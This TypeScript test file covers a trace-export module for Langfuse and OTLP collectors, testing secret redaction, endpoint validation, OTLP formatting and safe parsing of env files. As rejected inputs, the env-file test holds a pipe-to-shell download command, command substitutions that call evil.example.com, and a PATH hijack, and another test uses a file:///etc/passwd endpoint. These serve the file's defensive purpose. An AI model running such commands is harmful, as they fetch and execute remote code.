// Trace export to Langfuse or any OTLP/HTTP collector.
//
// Ways this can fail, written before the code:
//  1. A key or header reaches a span, a log or /trace (only the host is shown).
//  2. A token, Bearer/Basic credential, JWT, key=value secret, private key,
//     email, internal host or private IP in tool I/O is exported unredacted.
//  3. The size cap cuts before redaction and leaves half a secret.
//  4. An unserializable value throws inside the guard.
//  5. A malformed endpoint, or userinfo in the URL, is used or shown.
//  6. The OTLP body has ids or timestamps the collector rejects.
//  7. FOUNDRY_OTEL=off still exports; the tool I/O opt-out is ignored.
//  8. Basic auth is wrong for non-ASCII keys.
//  9. A turn that never touched Foundry is exported (checked live: /trace).
// 10. The env file runs as shell, or takes keys it should not (round 3, R1).
// 11. Redaction misses encoded or prefixed secrets, RIDs, envelope keys, flag values (R4, R5).
import { expect, test } from 'claude-code/testing'

import {
  base64,
  domainPatterns,
  langfuseApiBase,
  otlpBody,
  parseEnvFile,
  parseOtlpHeaders,
  randomHex,
  redactArgs,
  redactString,
  resourceAttributes,
  serializePayload,
  traceConfig,
} from './telemetry'

test('config: OTEL endpoint first, Langfuse keys second, off and opt-outs honored', async () => {
  const otel = traceConfig({ OTEL_EXPORTER_OTLP_TRACES_ENDPOINT: 'https://lf.example.com/api/public/otel/v1/traces', OTEL_EXPORTER_OTLP_HEADERS: 'Authorization=Basic%20abc,x-k=v' })
  expect(otel?.url).toBe('https://lf.example.com/api/public/otel/v1/traces')
  expect(otel?.headers.Authorization).toBe('Basic abc')
  expect(otel?.headers['Content-Type']).toBe('application/json')
  expect(otel?.toolIo).toBe(true)
  expect(traceConfig({ OTEL_EXPORTER_OTLP_ENDPOINT: 'https://c.example.com/' })?.url).toBe('https://c.example.com/v1/traces')
  const langfuse = traceConfig({ LANGFUSE_BASE_URL: 'https://lf.example.com/', LANGFUSE_PUBLIC_KEY: 'pk-lf-1', LANGFUSE_SECRET_KEY: 'sk-lf-2' })
  expect(langfuse?.url).toBe('https://lf.example.com/api/public/otel/v1/traces')
  expect(langfuse?.headers.Authorization).toBe(`Basic ${base64('pk-lf-1:sk-lf-2')}`)
  expect(langfuseApiBase(langfuse!)).toBe('https://lf.example.com/api/public')
  expect(langfuseApiBase(traceConfig({ OTEL_EXPORTER_OTLP_ENDPOINT: 'https://c.example.com' })!)).toBe(null)
  expect(traceConfig({ LANGFUSE_BASE_URL: 'https://lf.example.com', LANGFUSE_PUBLIC_KEY: 'pk' })).toBe(null)
  expect(traceConfig({ FOUNDRY_OTEL: 'OFF', OTEL_EXPORTER_OTLP_ENDPOINT: 'https://c.example.com' })).toBe(null)
  expect(traceConfig({ OTEL_EXPORTER_OTLP_ENDPOINT: 'https://c.example.com', PALANTIR_AGENT_OTEL_TOOL_IO: 'off' })?.toolIo).toBe(false)
  expect(traceConfig({ OTEL_EXPORTER_OTLP_ENDPOINT: 'https://c.example.com', FOUNDRY_OTEL_TOOL_IO: 'off' })?.toolIo).toBe(false)
  expect(traceConfig({})).toBe(null)
})

test('config: malformed endpoints are refused and userinfo never reaches the shown host', async () => {
  expect(traceConfig({ OTEL_EXPORTER_OTLP_TRACES_ENDPOINT: 'lf.example.com/v1/traces' })).toBe(null)
  expect(traceConfig({ OTEL_EXPORTER_OTLP_TRACES_ENDPOINT: 'file:///etc/passwd' })).toBe(null)
  expect(traceConfig({ OTEL_EXPORTER_OTLP_TRACES_ENDPOINT: 'https://user:pw@lf.example.com/x' })?.host).toBe('lf.example.com')
  expect(parseOtlpHeaders('bad,=x,k=%ZZ')).toEqual({ k: '%ZZ' })
})

test('base64 matches the standard encoding, non-ASCII included', async () => {
  expect(base64('pk-lf-1:sk-lf-2')).toBe('cGstbGYtMTpzay1sZi0y')
  expect(base64('a')).toBe('YQ==')
  expect(base64('ab')).toBe('YWI=')
  expect(base64('é✓😀')).toBe('w6ninJPwn5iA')
})

test('redaction: secrets, identities, internal hosts and private IPs never leave', async () => {
  const leaks = [
    'Bearer abcdefghijklmnop.qrstu',
    'Basic cGstbGYtMTpzay1sZi0y',
    'eyJhbGciOiJI.eyJzdWIiOiIx.c2lnbmF0dXJl',
    'ghp_' + 'a'.repeat(36),
    'sk-ant-' + 'b'.repeat(24),
    'AKIA' + 'C'.repeat(16),
    'password=hunter22',
    'token: abcd1234',
    'jane.doe@example.com',
    'foundry.corp',
    'stack.internal',
    '10.1.2.3',
    '192.168.4.5',
    '172.20.1.1',
    '-----BEGIN RSA PRIVATE KEY-----\nMIIE\n-----END RSA PRIVATE KEY-----',
  ]
  for (const leak of leaks) expect(redactString(`x ${leak} y`)).not.toContain(leak)
  expect(redactString('https://u:p@h.example.com/a?token=x')).toBe('https://[REDACTED]@h.example.com/a?[REDACTED]')
  expect(redactString('acme.palantirfoundry.com', domainPatterns('palantirfoundry.com'))).toBe('[REDACTED]')
  expect(domainPatterns('a.com,(bad,.b.org')).toHaveLength(2)
  expect(redactString('ontology list returned 3 object types')).toBe('ontology list returned 3 object types')
})

test('payloads: sensitive keys go, the cap comes after redaction, unserializable values drop', async () => {
  const json = serializePayload({ command: 'dataset create', args: ['--token', 'x'], rid: 'ri.foundry.main.dataset.1', secretKey: 's', session_id: 'keep' })!
  expect(json).toContain('"rid":"[REDACTED]"')
  expect(json).toContain('"secretKey":"[REDACTED]"')
  expect(json).toContain('"session_id":"keep"')
  const secret = 'ghp_' + 'z'.repeat(36)
  const long = serializePayload('a'.repeat(64 * 1024 - 10) + secret)!
  expect(long).not.toContain('ghp_')
  expect(long.endsWith('[TRUNCATED]')).toBe(true)
  const cycle: Record<string, unknown> = {}
  cycle.self = cycle
  expect(serializePayload(cycle)).toBe(undefined)
  expect(serializePayload(10n)).toBe(undefined)
  expect(serializePayload(undefined)).toBe(undefined)
})

test('OTLP body: hex ids, string nanos, parent links, error status, resource', async () => {
  const traceId = randomHex(32)
  expect(/^[0-9a-f]{32}$/.test(traceId)).toBe(true)
  expect(/^[0-9a-f]{16}$/.test(randomHex(16))).toBe(true)
  const resource = resourceAttributes({ OTEL_RESOURCE_ATTRIBUTES: 'raava.source=herdr-space' }, 'acme')
  expect(resource['service.name']).toBe('claude-foundry')
  expect(resource['palantir.agent.profile']).toBe('acme')
  expect(resourceAttributes({ OTEL_SERVICE_NAME: 'palantir-agent' }, null)['service.name']).toBe('palantir-agent')
  const body = JSON.parse(
    otlpBody(traceId, resource, [
      { spanId: 'a'.repeat(16), name: 'turn', startMs: 1000, endMs: 2000.4, attributes: { n: 2, ok: true, tags: ['x'] } },
      { spanId: 'b'.repeat(16), parentSpanId: 'a'.repeat(16), name: 'tool', startMs: 1500, endMs: 1400, attributes: {}, error: 'denied: x' },
    ]),
  )
  const [root, child] = body.resourceSpans[0].scopeSpans[0].spans
  expect(root.traceId).toBe(traceId)
  expect(root.startTimeUnixNano).toBe('1000000000')
  expect(root.endTimeUnixNano).toBe('2000000000')
  expect(root.parentSpanId).toBe(undefined)
  expect(root.attributes).toContainEqual({ key: 'n', value: { intValue: 2 } })
  expect(root.status.code).toBe(1)
  expect(child.parentSpanId).toBe('a'.repeat(16))
  expect(child.endTimeUnixNano).toBe(child.startTimeUnixNano)
  expect(child.status).toEqual({ code: 2, message: 'denied: x' })
  expect(body.resourceSpans[0].resource.attributes).toContainEqual({ key: 'raava.source', value: { stringValue: 'herdr-space' } })
})

test('env file is data: allowlisted keys, quotes, op:// references, no shell', async () => {
  const { env, refs } = parseEnvFile(
    [
      '# comment',
      'export LANGFUSE_BASE_URL=https://lf.example.com # trailing',
      'LANGFUSE_PUBLIC_KEY="op://Vault/Langfuse keys/public_key"',
      "LANGFUSE_SECRET_KEY='op://Vault/Langfuse keys/secret_key'",
      'OTEL_EXPORTER_OTLP_ENDPOINT=$(curl evil.example.com)',
      'OTEL_SERVICE_NAME=`id`',
      'PATH=/tmp/evil',
      'curl https://evil.example.com | sh',
    ].join('\n'),
  )
  expect(env).toEqual({ LANGFUSE_BASE_URL: 'https://lf.example.com' })
  expect(parseEnvFile('LANGFUSE_SECRET_KEY=sk-lf-literal\nOTEL_EXPORTER_OTLP_HEADERS=Authorization=Basic%20x')).toEqual({
    env: {},
    refs: {},
    literalSecrets: ['LANGFUSE_SECRET_KEY', 'OTEL_EXPORTER_OTLP_HEADERS'],
  })
  expect(parseEnvFile('OTEL_EXPORTER_OTLP_ENDPOINT=https://u:p@h.example.com\nLANGFUSE_BASE_URL=https://h.example.com?token=x').literalSecrets).toEqual([
    'OTEL_EXPORTER_OTLP_ENDPOINT',
    'LANGFUSE_BASE_URL',
  ])
  expect(refs).toEqual({ LANGFUSE_PUBLIC_KEY: 'op://Vault/Langfuse keys/public_key', LANGFUSE_SECRET_KEY: 'op://Vault/Langfuse keys/secret_key' })
})

test('round 3 redaction: Langfuse keys, encoded auth, prefixed secret names, curl -u, RIDs', async () => {
  const leaks: [string, string][] = [
    ['LANGFUSE_PUBLIC_KEY=pk-lf-0123abcd-ef', 'pk-lf-0123abcd'],
    ['sk-lf-9876fedc-ba', 'sk-lf-9876'],
    ['OTEL_EXPORTER_OTLP_HEADERS=Authorization=Basic%20QUJDREVGR0hJSktM', 'QUJDREVGR0hJSktM'],
    ['FOO_SECRET_KEY=hunter2hunter2', 'hunter2hunter2'],
    ['DATABASE_PASSWORD=hunter2hunter2', 'hunter2hunter2'],
    ['Authorization: abcdef0123456789', 'abcdef0123456789'],
    ['curl -u user:pass https://a.b/c', 'user:pass'],
    ['see ri.foundry.main.dataset.0f6c2a1e-1b2c here', 'ri.foundry.main.dataset'],
  ]
  for (const [text, secret] of leaks) expect(redactString(text)).not.toContain(secret)
})

test('round 3 payloads: envelope strings redact by key, secret flag values go', async () => {
  const envelope = JSON.stringify({ data: { token: 'abcdef12345', name: 'Acme', count: 3 } })
  const out = serializePayload(envelope)!
  expect(out).not.toContain('abcdef12345')
  expect(out).not.toContain('Acme')
  expect(out).toContain('"count":3')
  const args = serializePayload({ command: 'x', args: ['--password', 'hunter2hunter2', '--token=abcd1234efgh', '--limit', '5'] })! // gitleaks:allow (fake test values)
  expect(args).not.toContain('hunter2hunter2')
  expect(args).not.toContain('abcd1234efgh')
  expect(args).toContain('"5"')
  expect(redactArgs(['--key', 'v', 'pos'])).toEqual(['--key', '[REDACTED]', 'pos'])
})

test('round 4: redaction stays linear on long adversarial runs', async () => {
  const inputs = ['a'.repeat(60000) + '_'.repeat(30000), 'x_'.repeat(30000) + '=', 'a.'.repeat(40000), 'a'.repeat(64000), 'a:'.repeat(40000)]
  const started = Date.now()
  for (const input of inputs) redactString(input)
  expect(Date.now() - started).toBeLessThan(500)
})
